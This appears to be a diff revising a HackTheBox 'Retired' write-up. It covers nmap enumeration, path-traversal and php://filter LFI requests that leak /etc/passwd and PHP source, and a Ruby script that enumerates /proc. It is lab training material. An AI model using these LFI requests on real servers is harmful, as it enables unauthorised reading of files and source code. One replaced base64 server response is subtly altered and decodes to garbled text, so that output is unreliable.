@@ -15,23 +15,13 @@ published: true
 
 ## Introduction
 
-In cybersecurity, hands-on experience is essential for developing practical skills and knowledge. One of the best ways to gain this experience is by participating in capture-the-flag (CTF) challenges and solving challenges on platforms like HackTheBox. HackTheBox is a popular platform for practising and developing penetration testing skills, featuring a wide range of virtual machines with various difficulty levels.
+Retired is a HackTheBox machine that chains a few classic tricks: a PHP LFI that leaks source through `php://filter`, a stack buffer overflow in a custom service listening on `127.0.0.1:1337`, a backup script we abuse with a symlink to steal an SSH key, and finally a privileged helper that registers `binfmt_misc` handlers and gives us root.
 
-One of the most exciting and challenging HackTheBox machines is "Retired", which requires a deep understanding of penetration testing methodologies and techniques to solve. This blog post will explore the Retired box in detail, discussing its background, methodology, and solutions to help aspiring penetration testers and security researchers improve their skills and knowledge.
-
-We can solve the "Retired" box in the following steps: enumeration, exploitation, lateral movement and privilege escalation. Below is a short description of each stage.
-
-Enumeration is a crucial stage in penetration testing, where the tester tries to identify and gather information about the target system, network, or application. This stage involves actively probing the target to discover the system's services, open ports, and other details about the operating system and its configuration. Enumeration gives the tester valuable insights into the target's architecture, which can be used to develop an attack strategy and exploit potential vulnerabilities. An efficient enumeration process involves using various tools and techniques, including port scanning, banner grabbing, and network mapping, to identify weaknesses and misconfigurations that can be exploited to gain unauthorised access.
-
-The exploitation stage is the process in penetration testing where the tester attempts to take advantage of the vulnerabilities found during the previous steps to gain unauthorised access to the target system, network or application. This stage requires a thorough understanding of the target environment and the vulnerabilities discovered during the reconnaissance and enumeration stages. The exploitation stage involves using various tools and techniques to exploit the identified vulnerabilities, such as buffer overflow, SQL injection, and remote code execution. This stage aims to gain access to sensitive information, escalate privileges, or take control of the target system. The success of the exploitation stage will depend on the tester's ability to craft a suitable exploit that can bypass any security mechanisms.
-
-Lateral movement is a critical stage in the penetration testing process that involves an attacker's ability to move from one compromised system to another within the target network or from one user account to another. Lateral movement often follows the initial exploitation stage, where the attacker gains access to the target system. The attacker then looks for ways to move laterally to other systems or accounts within the network, using the same or different techniques as the initial exploitation. Lateral movement is a significant concern for organisations since it can allow attackers to access and control more sensitive information and make it more challenging for defenders to track and contain the attack. During a penetration testing engagement, lateral movement simulates a real-world attack and assesses the target's overall security posture, including access controls, network segmentation, and incident response capabilities.
-
-The privilege escalation stage in penetration testing involves attempting to escalate privileges on the target system or application. This stage is typically conducted after the initial exploitation, and access to the target has been achieved. The goal of the privilege escalation stage is to elevate the access level of the tester to gain administrative or system-level access, which can allow for deeper access and control of the target environment. The privilege escalation stage may involve identifying and exploiting misconfigured permissions, vulnerabilities, or configuration settings that can be used to obtain higher privileges. This stage is critical in penetration testing because it allows the tester to assess the potential damage that could be caused if an attacker gains elevated privileges in a real-world attack.
+The path is **www-data → dev → root**.
 
 ## Enumeration
 
-Our first step is a port scan with nmap. This will inform us about the operating system and services on the target host:
+We start with an nmap scan to identify open ports and services:
 
 ```bash
 $ sudo nmap -sSVC -A -O -Pn -T5 -p- 10.129.194.147
@@ -60,11 +50,11 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 336.33 seconds
 ```
 
-We see two ports opened, SSH and HTTP. Let's check HTTP one in a browser. We can see a suspicious part in the URL when the page is visible:
+Two ports are open: SSH on 22 and HTTP on 80. Opening port 80 in a browser, the URL parameter immediately looks suspicious:
 
 ![Webpage with LFI](page.png)
 
-It looks like LFI, and we can confirm it by including some files from the host filesystem:
+That smells like LFI. We confirm by reading `/etc/passwd`:
 
 ```python
 $ http -v 'http://retired.htb/index.php?page=../../../../../../../../../../etc/passwd'
@@ -113,7 +103,7 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 dev:x:1001:1001::/home/dev:/bin/bash
 ```
 
-With that knowledge, we can get the application source, i.e., index.php and other files, for further checking. We'll use filters to encode the content, so PHP will not interpret it:
+There is a `dev` user worth remembering. With the LFI confirmed, we can pull PHP source through `php://filter` so the code is not executed on the way out:
 
 ```python
 $ http -v 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php'
@@ -135,7 +125,7 @@ Transfer-Encoding: chunked
 PD9waHAKZnVuY3Rpb24gc2FuaXRpemVfaW5wdXQoJHBhcmFtKSB7CiAgICAkcGFyYW0xID0gc3RyX3JlcGxhY2UoIi4uLyIsIiIsJHBhcmFtKTsKICAgICRwYXJhbTIgPSBzdHJfcmVwbGFjZSgiLi8iLCIiLCRwYXJhbTEpOwogICAgcmV0dXJuICRwYXJhbTI7Cn0KCiRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsKaWYgKGlzc2V0KCRwYWdlKSAmJiBwcmVnX21hdGNoKCIvXlthLXpdLyIsICRwYWdlKSkgewogICAgJHBhZ2UgPSBzYW5pdGl6ZV9pbnB1dCgkcGFnZSk7Cn0gZWxzZSB7CiAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaW5kZXgucGhwP3BhZ2U9ZGVmYXVsdC5odG1sJyk7Cn0KCnJlYWRmaWxlKCRwYWdlKTsKPz4K
 ```
 
-And voila! We've got `index.php`:
+Decoded, `index.php` looks like this:
 
 ```python
 <?php
@@ -156,7 +146,9 @@ readfile($page);
 ?>
 ```
 
-Let's try something else and check for any hidden files or directories on that host. After some time with gobuster, we see a beta.html page:
+The `sanitize_input()` function only strips literal `../` and `./` sequences, and the regex check `^[a-z]` does not block `php://` since stream wrappers start with a letter. Effectively, anything that starts with a lowercase letter is fair game.
+
+Next, a directory bruteforce with gobuster turns up a `beta.html` page:
 
 ```python
 $ gobuster dir -x txt,sql,bak,zip,bz2,7z,htm,html,js,php -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://retired.htb 
@@ -189,7 +181,7 @@ Progress: 503294 / 2426171 (20.74%)                                             
 ===============================================================
 ```
 
-We can download it the same way as index.php:
+We grab it the same way:
 
 ```python
 $ http -v 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=beta.html'                                                                                                                
@@ -208,14 +200,14 @@ Date: Sat, 02 Apr 2022 19:41:07 GMT
 Server: nginx
 Transfer-Encoding: chunked
 
-PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICAgIDxoZWFkPgogICAgICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgogICAgICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyIgLz4KICAgICAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iIiAvPgogICAgICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgogICAgICAgIDx0aXRsZT5BZ2VuY3kgLSBTdGFydCBCb290c3RyYXAgVGhlbWU8L3RpdGxlPgogICAgICAgIDwhLS0gRmF2aWNvbi0tPgogICAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJhc3NldHMvZmF2aWNvbi5pY28iIC8+CiAgICAgICAgPCEtLSBGb250IEF3ZXNvbWUgaWNvbnMgKGZyZWUgdmVyc2lvbiktLT4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly91c2UuZm9udGF3ZXNvbWUuY29tL3JlbGVhc2VzL3Y1LjE1LjMvanMvYWxsLmpzIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgICAgICA8IS0tIEdvb2dsZSBmb250cy0tPgogICAgICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Nb250c2VycmF0OjQwMCw3MDAiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIC8+CiAgICAgICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVJvYm90bytTbGFiOjQwMCwxMDAsMzAwLDcwMCIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgLz4KICAgICAgICA8IS0tIENvcmUgdGhlbWUgQ1NTIChpbmNsdWRlcyBCb290c3RyYXApLS0+CiAgICAgICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KICAgIDwvaGVhZD4KICAgIDxib2R5IGlkPSJwYWdlLXRvcCI+CiAgICAgICAgPCEtLSBNYXN0aGVhZC0tPgogICAgICAgIDxoZWFkZXIgY2xhc3M9Im1hc3RoZWFkIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1hc3RoZWFkLXN1YmhlYWRpbmciPldlbGNvbWUgVG8gT3VyIFN0dWRpbyE8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1hc3RoZWFkLWhlYWRpbmcgdGV4dC11cHBlcmNhc2UiPkl0J3MgTmljZSBUbyBNZWV0IFlvdTwvZGl2PgogICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSBidG4teGwgdGV4dC11cHBlcmNhc2UiIGhyZWY9IiNzZXJ2aWNlcyI+VGVsbCBNZSBNb3JlPC9hPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2hlYWRlcj4KICAgICAgICA8IS0tIFNlcnZpY2VzLS0+CiAgICAgICAgPHNlY3Rpb24gY2xhc3M9InBhZ2Utc2VjdGlvbiIgaWQ9ImJldGEiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idGV4dC1jZW50ZXIiPgogICAgICAgICAgICAgICAgICAgIDxoMiBjbGFzcz0ic2VjdGlvbi1oZWFkaW5nIHRleHQtdXBwZXJjYXNlIj5CZXRhIFRlc3RpbmcgUHJvZ3JhbSBmb3IgRU1VRU1VPC9oMj4KICAgICAgICAgICAgICAgICAgICBDdXJyZW50bHkgZGV2ZWxvcG1lbnQgZm9yIEVNVUVNVSBqdXN0IHN0YXJ0ZWQsIGJ1dCB3ZSBoYXZlIGJpZyBwbGFucy4KICAgICAgICAgICAgICAgICAgICBJZiB5b3UgYm91Z2h0IGFuIE9TVFJJQ0ggY29uc29sZSBmcm9tIHVzIGFuZCB3YW50IHdhbnQgdG8gYmUgcGFydCBvZiB0aGUgbmV4dCBzdGVwLAogICAgICAgICAgICAgICAgICAgIHlvdSBjYW4gZW5hYmxlIHlvdXIgT1NUUklDSCBsaWNlbnNlIGZvciB1c2FnZSB3aXRoIEVNVUVNVSB2aWEgdGhlIGFjdGl2YXRlX2xpY2Vuc2UgYXBwbGljYXRpb24gdG9kYXkKCQkgICAgZm9yIG91ciB1cGNvbWluZyBiZXRhIHRlc3RpbmcgcHJvZ3JhbSBmb3IgRU1VRU1VLjxici8+CiAgICAgICAgICAgICAgICAgICAgQSBsaWNlbnNlIGZpbGVzIGNvbnRhaW5zIGEgNTEyIGJpdCBrZXkuIFRoYXQga2V5IGlzIGFsc28gaW4gdGhlIFFSIGNvZGUgY29udGFpbmVkIHdpdGhpbiB0aGUgT1NUUklDSCBwYWNrYWdlLgoJCSAgICBUaGFuayB5b3UgZm9yIHBhcnRpY2lwYXRpbmcgaW4gb3VyIGJldGEgdGVzdGluZyBwcm9ncmFtLgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8Zm9ybSBhY3Rpb249ImFjdGl2YXRlX2xpY2Vuc2UucGhwIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImZvcm1GaWxlIiBjbGFzcz0iZm9ybS1sYWJlbCI+VXBsb2FkIExpY2Vuc2UgS2V5IEZpbGU8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIGZvcm0tY29udHJvbC1sZyIgaWQ9ImZvcm1GaWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJsaWNlbnNlZmlsZSIvPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5Ij5TdWJtaXQ8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9zZWN0aW9uPgogICAgICAgIDwhLS0gRm9vdGVyLS0+CiAgICAgICAgPGZvb3RlciBjbGFzcz0iZm9vdGVyIHB5LTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IGFsaWduLWl0ZW1zLWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTQgdGV4dC1sZy1zdGFydCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vc3RhcnRib290c3RyYXAuY29tL3RoZW1lL2FnZW5jeSI+QWdlbmN5IEJvb3RzdHJhcCBUaGVtZTwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgcmVsZWFzZWQgdW5kZXIgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL3N0YXJ0Ym9vdHN0cmFwL3N0YXJ0Ym9vdHN0cmFwLWFnZW5jeS9ibG9iL21hc3Rlci9MSUNFTlNFIj5NSVQgTGljZW5zZTwvYT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCBteS0zIG15LWxnLTAiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1kYXJrIGJ0bi1zb2NpYWwgbXgtMiIgaHJlZj0iIyEiPjxpIGNsYXNzPSJmYWIgZmEtdHdpdHRlciI+PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tZGFyayBidG4tc29jaWFsIG14LTIiIGhyZWY9IiMhIj48aSBjbGFzcz0iZmFiIGZhLWZhY2Vib29rLWYiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLWRhcmsgYnRuLXNvY2lhbCBteC0yIiBocmVmPSIjISI+PGkgY2xhc3M9ImZhYiBmYS1saW5rZWRpbi1pbiI+PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCB0ZXh0LWxnLWVuZCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJsaW5rLWRhcmsgdGV4dC1kZWNvcmF0aW9uLW5vbmUgbWUtMyIgaHJlZj0iIyEiPlByaXZhY3kgUG9saWN5PC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibGluay1kYXJrIHRleHQtZGVjb3JhdGlvbi1ub25lIiBocmVmPSIjISI+VGVybXMgb2YgVXNlPC9hPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZm9vdGVyPgogICAgICAgIDwhLS0gQm9vdHN0cmFwIGNvcmUgSlMtLT4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjAvZGlzdC9qcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPCEtLSBDb3JlIHRoZW1lIEpTLS0+CiAgICAgICAgPHNjcmlwdCBzcmM9ImpzL3NjcmlwdHMuanMiPjwvc2NyaXB0PgogICAgPC9ib2R5Pgo8L2h0bWw+Cg==
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICAgIDxoZWFkPgogICAgICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgogICAgICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyIgLz4KICAgICAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iIiAvPgogICAgICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgogICAgICAgIDx0aXRsZT5BZ2VuY3kgLSBTdGFydCBCb290c3RyYXAgVGhlbWU8L3RpdGxlPgogICAgICAgIDwhLS0gRmF2aWNvbi0tPgogICAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJhc3NldHMvZmF2aWNvbi5pY28iIC8+CiAgICAgICAgPCEtLSBGb250IEF3ZXNvbWUgaWNvbnMgKGZyZWUgdmVyc2lvbiktLT4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly91c2UuZm9udGF3ZXNvbWUuY29tL3JlbGVhc2VzL3Y1LjE1LjMvanMvYWxsLmpzIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgICAgICA8IS0tIEdvb2dsZSBmb250cy0tPgogICAgICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Nb250c2VycmF0OjQwMCw3MDAiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIC8+CiAgICAgICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVJvYm90bytTbGFiOjQwMCwxMDAsMzAwLDcwMCIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgLz4KICAgICAgICA8IS0tIENvcmUgdGhlbWUgQ1NTIChpbmNsdWRlcyBCb290c3RyYXApLS0+CiAgICAgICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KICAgIDwvaGVhZD4KICAgIDxib2R5IGlkPSJwYWdlLXRvcCI+CiAgICAgICAgPCEtLSBNYXN0aGVhZC0tPgogICAgICAgIDxoZWFkZXIgY2xhc3M9Im1hc3RoZWFkIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1hc3RoZWFkLXN1YmhlYWRpbmciPldlbGNvbWUgVG8gT3VyIFN0dWRpbyE8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1hc3RoZWFkLWhlYWRpbmcgdGV4dC11cHBlcmNhc2UiPkl0J3MgTmljZSBUbyBNZWV0IFlvdTwvZGl2PgogICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSBidG4teGwgdGV4dC11cHBlcmNhc2UiIGhyZWY9IiNzZXJ2aWNlcyI+VGVsbCBNZSBNb3JlPC9hPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2hlYWRlcj4KICAgICAgICA8IS0tIFNlcnZpY2VzLS0+CiAgICAgICAgPHNlY3Rpb24gY2xhc3M9InBhZ2Utc2VjdGlvbiIgaWQ9ImJldGEiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idGV4dC1jZW50ZXIiPgogICAgICAgICAgICAgICAgICAgIDxoMiBjbGFzcz0ic2VjdGlvbi1oZWFkaW5nIHRleHQtdXBwZXJjYXNlIj5CZXRhIFRlc3RpbmcgUHJvZ3JhbSBmb3IgRU1VRU1VPC9oMj4KICAgICAgICAgICAgICAgICAgICBDdXJyZW50bHkgZGV2ZWxvcG1lbnQgZm9yIEVNVUVNVSBqdXN0IHN0YXJ0ZWQsIGJ1dCB3ZSBoYXZlIGJpZyBwbGFucy4KICAgICAgICAgICAgICAgICAgICBJZiB5b3UgYm91Z2h0IGFuIE9TVFJJQ0ggY29uc29sZSBmcm9tIHVzIGFuZCB3YW50IHdhbnQgdG8gYmUgcGFydCBvZiB0aGUgbmV4dCBzdGVwLAogICAgICAgICAgICAgICAgICAgIHlvdSBjYW4gZW5hYmxlIHlvdXIgT1NUUklDSCBsaWNlbnNlIGZvciB1c2FnZSB6IEVNVUVNVSB2aWEgdGhlIGFjdGl2YXRlX2xpY2Vuc2UgYXBwbGljYXRpb24gdG9kYXkKCQkgICAgZm9yIG91ciB1cGNvbWluZyBiZXRhIHRlc3RpbmcgcHJvZ3JhbSBmb3IgRU1VRU1VLjxici8+CiAgICAgICAgICAgICAgICAgICAgQSBsaWNlbnNlIGZpbGVzIGNvbnRhaW5zIGEgNTEyIGJpdCBrZXkuIFRoYXQga2V5IGlzIGFsc28gaW4gdGhlIFFSIGNvZGUgY29udGFpbmVkIHdpdGhpbiB0aGUgT1NUUklDSCBwYWNrYWdlLgoJCSAgICBUaGFuayB5b3UgZm9yIHBhcnRpY2lwYXRpbmcgdyBvdXIgYmV0YSB0ZXN0aW5nIHByb2dyYW0uCiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iYWN0aXZhdGVfbGljZW5zZS5waHAiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iZm9ybUZpbGUiIGNsYXNzPSJmb3JtLWxhYmVsIj5VcGxvYWQgTGljZW5zZSBLZXkgRmlsZTwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJmb3JtLWNvbnRyb2wgZm9ybS1jb250cm9sLWxnIiBpZD0iZm9ybUZpbGUiIHR5cGU9ImZpbGUiIG5hbWU9ImxpY2Vuc2VmaWxlIi8+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiPlN1Ym1pdDwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L3NlY3Rpb24+CiAgICAgICAgPCEtLSBGb290ZXItLT4KICAgICAgICA8Zm9vdGVyIGNsYXNzPSJmb290ZXIgcHktNCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCB0ZXh0LWxnLXN0YXJ0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9zdGFydGJvb3RzdHJhcC5jb20vdGhlbWUvYWdlbmN5Ij5BZ2VuY3kgQm9vdHN0cmFwIFRoZW1lPC9hPgogICAgICAgICAgICAgICAgICAgICAgICByZWxlYXNlZCB1bmRlciA8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vc3RhcnRib290c3RyYXAvc3RhcnRib290c3RyYXAtYWdlbmN5L2Jsb2IvbWFzdGVyL0xJQ0VOU0UiPk1JVCBMaWNlbnNlPC9hPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy00IG15LTMgbXktbGctMCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLWRhcmsgYnRuLXNvY2lhbCBteC0yIiBocmVmPSIjISI+PGkgY2xhc3M9ImZhYiBmYS10d2l0dGVyIj48L2k+PC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1kYXJrIGJ0bi1zb2NpYWwgbXgtMiIgaHJlZj0iIyEiPjxpIGNsYXNzPSJmYWIgZmEtZmFjZWJvb2stZiI+PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tZGFyayBidG4tc29jaWFsIG14LTIiIGhyZWY9IiMhIj48aSBjbGFzcz0iZmFiIGZhLWxpbmtlZGluLWluIj48L2k+PC9hPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy00IHRleHQtbGctZW5kIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImxpbmstZGFyayB0ZXh0LWRlY29yYXRpb24tbm9uZSBtZS0zIiBocmVmPSIjISI+UHJpdmFjeSBQb2xpY3k8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJsaW5rLWRhcmsgdGV4dC1kZWNvcmF0aW9uLW5vbmUiIGhyZWY9IiMhIj5UZXJtcyBvZiBVc2U8L2E+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9mb290ZXI+CiAgICAgICAgPCEtLSBCb290c3RyYXAgY29yZSBKUy0tPgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMC9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8IS0tIENvcmUgdGhlbWUgSlMtLT4KICAgICAgICA8c2NyaXB0IHNyYz0ianMvc2NyaXB0cy5qcyI+PC9zY3JpcHQ+CiAgICA8L2JvZHk+CjwvaHRtbD4K
 ```
 
-Inside that page is a web form that uses another file called `activate_licence.php` :
+The page contains an upload form that posts to `activate_license.php`:
 
 ![Form on a beta page](form.png)
 
-So, again, let's download it and check what's inside:
+We pull that file too:
 
 ```python
 $ http -v 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=activate_license.php' 
@@ -237,7 +229,7 @@ Transfer-Encoding: chunked
 PD9waHAKaWYoaXNzZXQoJF9GSUxFU1snbGljZW5zZWZpbGUnXSkpIHsKICAgICRsaWNlbnNlICAgICAgPSBmaWxlX2dldF9jb250ZW50cygkX0ZJTEVTWydsaWNlbnNlZmlsZSddWyd0bXBfbmFtZSddKTsKICAgICRsaWNlbnNlX3NpemUgPSAkX0ZJTEVTWydsaWNlbnNlZmlsZSddWydzaXplJ107CgogICAgJHNvY2tldCA9IHNvY2tldF9jcmVhdGUoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOwogICAgaWYgKCEkc29ja2V0KSB7IGVjaG8gImVycm9yIHNvY2tldF9jcmVhdGUoKVxuIjsgfQoKICAgIGlmICghc29ja2V0X2Nvbm5lY3QoJHNvY2tldCwgJzEyNy4wLjAuMScsIDEzMzcpKSB7CiAgICAgICAgZWNobyAiZXJyb3Igc29ja2V0X2Nvbm5lY3QoKSIgLiBzb2NrZXRfc3RyZXJyb3Ioc29ja2V0X2xhc3RfZXJyb3IoKSkgLiAiXG4iOwogICAgfQoKICAgIHNvY2tldF93cml0ZSgkc29ja2V0LCBwYWNrKCJOIiwgJGxpY2Vuc2Vfc2l6ZSkpOwogICAgc29ja2V0X3dyaXRlKCRzb2NrZXQsICRsaWNlbnNlKTsKCiAgICBzb2NrZXRfc2h1dGRvd24oJHNvY2tldCk7CiAgICBzb2NrZXRfY2xvc2UoJHNvY2tldCk7Cn0KPz4K
 ```
 
-This one is interesting:
+Decoded:
 
 ```python
 <?php
@@ -261,17 +253,17 @@ if(isset($_FILES['licensefile'])) {
 ?>
 ```
 
-It shows some internal service listening on the `1337` port, but what's that? How can we get the information about this service? The answer is `/proc` - we can try to enumerate it and get information from:
+So there is an internal service on port `1337` that the upload handler forwards data to. Since the LFI also reads from `/proc`, we can enumerate processes and find out what it is. The useful files are:
 
-- /proc/sys/kernel/version
-- /proc/sys/kernel/pid_max
-- /proc/sys/kernel/randomize_va_space
-- /proc/sys/kernel/hostname
-- /proc/sys/kernel/domainname
-- /proc/<pid>/cmdline
-- /proc/<pid>/maps
+- `/proc/sys/kernel/version`
+- `/proc/sys/kernel/pid_max`
+- `/proc/sys/kernel/randomize_va_space`
+- `/proc/sys/kernel/hostname`
+- `/proc/sys/kernel/domainname`
+- `/proc/<pid>/cmdline`
+- `/proc/<pid>/maps`
 
-Here is a simple script in ruby which can do it for us:
+A small ruby script walks them for us:
 
 ```ruby
 require 'net/http'
@@ -334,7 +326,7 @@ puts "[maps]\n#{Base64.decode64(res.body)}\n"
 end
 ```
 
-And here is its output (I've truncated maps from unessential processes for brevity):
+Output (memory maps for unrelated processes trimmed):
 
 ```bash
 $ ruby lfi-proc.rb
@@ -415,7 +407,7 @@ domain name: (none)
 ^C
 ```
 
-OK, we found the activate_license binary at PID `417`. It was started from `/usr/bin/activate_license` path. Let's download it:
